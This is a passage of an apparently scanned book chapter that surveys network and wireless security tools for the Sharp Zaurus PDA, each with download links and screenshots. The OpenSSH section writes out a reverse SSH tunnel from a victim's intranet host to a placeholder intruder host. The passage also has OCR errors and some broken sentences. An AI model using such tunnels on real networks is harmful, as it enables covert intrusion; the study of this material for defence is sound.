
# Chapter 12

## Hacking with the Sharp Zaurus PDA

+ IN THIS CHAPTER:
- Kismet
- Wellenreiter II
- Nmap
- Openmap
- Bing
- OpenSSH
- Hping2
- VNC Server
- Keypebble VNC Viewer
- Smbmount
- Tcpdump
- Wget
- ZEthereal
- zNessus
- MTR
- Dig
- Perl
- Online Resources for the Zaurus
- Summary

## 178 Part III: Special Topics

The Sharp Zaurus PDA (personal digital assistant) device runs an embedded version of the Linux operating system. The PDA has built-in features for various compact-flash 802.11 network cards. These features, along with the PDA’s small form factor, make the Zaurus a powerful device. In this chapter, we will take a look at the many Linux security tools that have already been ported for the Zaurus architecture. Screenshots are presented wherever possible in order to satisfy your curiosity.

## KISMET

Kismet is a wireless network sniffer that can be used to capture and view information about wireless networks in an area. Intruders no longer need to lug around bulky laptops in an area. All that is needed is the Zaurus PDA, accompanied by the Kismet port available for download at http://kismetwireless.net/code/. Once you download, uncompress, and untar the tar.gz file available from this URL, you will find an ipk package file in the kismetarm directory that is created. Open this file using the File Manager in order to install Kismet, which looks like this when running on the PDA.

![](img/17cb132e62949dc7f5e0eadf90c71f51_232_0.png)

A GUI for Kismet is available at http://sourceforge.net/projects/kismet-qte/

## WELLENREITER II

Wellenreiter is a wireless network monitor that can be used to detect and identify wireless networks in an area. Future versions of Wellenreiter will support WEP cracking and packet injection. Download Wellenreiter at http://opie.net.wox/wellenreiter/feed/

## NMAP

Once an intruder has gained access to a wireless network by using tools such as Kismet, he or she is likely to perform network scans against the network's IP ranges in order to discover and enumerate hosts. Nmap is one of the most feature-rich port scanners available today. (Please see Chapter 2 for details on how to use Nmap to perform port scans using a variety of methods.) A Zaurus port of Nmap (shown next) is available from http://familiar.handhelds.org/familiar/releases/v0.7/base/armv4l/

![](img/17cb132e62949dc7f5e0eadf90c71f51_233_0.png)

## QOPENMAPFE

Qpenmapfe, a GUI front end to the Zaurus Nmap port shown in Figure 12-3, is available from http://home.midsouth.rr.com/zaurus/. This is a useful tool for those who are not familiar or comfortable with using Nmap's command-line arguments.

## 180 Part III: Special Topics

![](img/17cb132e62949dc7f5e0eadf90c71f51_234_0.png)

## BING

Bing, shown in the following dialog box, is a simple script that automates port scanning. When executed, it discovers live hosts on the current subnet by broadcasting ping requests. It then presents a list of hosts on the subnet that respond to ICMP echo requests. You can then pick a host from the given list to perform a port scan against (using Nmap). Download Bing's package file from http://www.claystuckey.com/chad/bing_0.0.1_arm.ip.

![](img/17cb132e62949dc7f5e0eadf90c71f51_234_1.png)

## OPENSSH

The OpenSSH suite consists of free versions of clients supporting the SSH protocol. It also includes a free version of an SSH server. The Zaurus

## Chapter 12: Hacking with the Sharp Zaurus PDA 181

port of OpenSSH can be found at http://killefiz.de/zaurus/showdetail.php?app=1035. An intruder may use the OpenSSH to create a secure tunnel leading from an organization's network to the comfort of his or her home. Consider the case where an intruder who has gained access to an organization's wireless network launches the following command on his or her PDA:

```
ssh -R 80:intranet.victorgansanexample.com:8000 intruder@intruders_ip
```

After the intruder issues this command and types in the password to his or account, a secure tunnel will be established between the organization's network and the intruder's host. Any connection on port 80 of the victim's internal host, intranet.victorgansanexample.com, via the secure OpenSSH tunnel. Now, all the intruder must find a secure place to hide his or Zaurus, and return to his or her home in order to exploit intranet.victorgansanexample.com at his or her convenience!

## HPING2

Hping2 is a tool to send arbitrary network packets. It can be used by intruders to test firewall rule sets of an organization. The manual page for Hping2 is available at http://www.hping.org/manpage.html. A Zaurus port is available from http://killefiz.de/zaurus/showdetail.php?app=902. The following illustration shows Hping2 in action. Note that it runs with the -s flag, which sends SYN packets to the destination host on port 111. Since the destination is listening on this port, it responds with a SYN+ACK packet, with `flags=SA` in Hping2's output.

| Terminal | |
| --- | --- |
| Font | |
| bash-2.05# ./hping2 -S 127.0.0.1 -p 111 |
127.0.0.1 (to 127.0.0.1):S set.0
len=44, udp=0 data bytes
44:ip 127.0.0.1 flags=SA DF seq=0
ttl=64 win=16386 r=1,3ms
44:ip 127.0.0.1 flags=SA DF seq=1
ttl=64 win=16386 r=1,0ms
44:ip 127.0.0.1 flags=SA DF seq=2
ttl=64 win=16386 r=1,0ms
44:ip 127.0.0.1 flags=SA DF seq=3
ttl=64 win=16386 r=1,0ms

--- 127.0.0.1 statistic ---
4 packets transmitted, 4 packets received
0 packet loss
round-trip min/avg/max = 1.0/1.1/1.3 ms
bash-2.05# |

![](img/17cb132e62949dc7f5e0eadf90c71f51_235_0.png)

## 182 Part III: Special Topics

## VNC SERVER

VNC (Virtual Network Computing) is a remote-control software that enables users to access the desktop of another host. A Zaurus port is available from http://sdystems.com/download. Often, users misconfigure VNC servers with weak or no passwords. An intruder who has gained access to an organization's intranet can use a VNC server to access vulnerable hosts (see Figure 12-1).

![](img/17cb132e62949dc7f5e0eadf90c71f51_236_0.png)

## KEYPEBBLE VNC VIEWER

Very often, users incorrectly configure VNC servers with weak or no passwords. An intruder who has gained access to a wireless network can use a VNC viewer (see the following illustration). One such viewer, Keypebble VNC viewer, is available for the Zaurus and can be downloaded from http://killefiz.de/zaurus/showdetail.php?app=186.

![](img/17cb132e62949dc7f5e0eadf90c71f51_237_0.png)

## SMBMOUNT

The SMBmount tool allows users to mount Samba network shares. Often, users misconfigure their Samba shares with weak or no passwords. The SMBmount tool can be used by intruders to access such shares. (Please see Chapter 4 for details on Samba misconfigurations.) A Zaurus port for the SMBmount tool can be found at http://www.dasgehtnichtan.de/zaurus.html.

## TCPDUMP

Tcpdump is a popular network analyzer program that can be used to sniff sensitive data on a network segment. Tcpdump and other network analyzer programs are also used by network administrators to perform troubleshooting. Tcpdump for the Zaurus can be downloaded from http://www.sklogicsoftware.com/znetmeter/tcpdump_zaurus.html.

## 184 Part III: Special Topics

![](img/17cb132e62949dc7f5e0eadf90c71f51_238_0.png)

## WGET

Wget is a tool used for downloading files using the HTTP, HTTPS, and FTP protocols. It has many useful features, including the ability to recursively download files from a web site. An intruder who has gained access to an organization’s wireless network can use Wget to quickly mirror the organization’s intranet network site. Wget is installed by default on the Zaurus.

## ZETHERALE

Zthereal is a port of the popular GUI network analyzer, Ethereal. Zthereal binaries and screenshots can be obtained at http://www.cartel-info.fr/pbiondi/zaurus/zethereal.html. Detailed information and documentation about Ethereal can be found at http://www.ethereal.com/.

## ZNESSUS

The zNessus tool is a Zaurus port of the Nessus GUI client. Screenshots and binaries are available at http://znessus.sourceforge.net/. zNessus can be used to remotely configure and launch vulnerability checks from
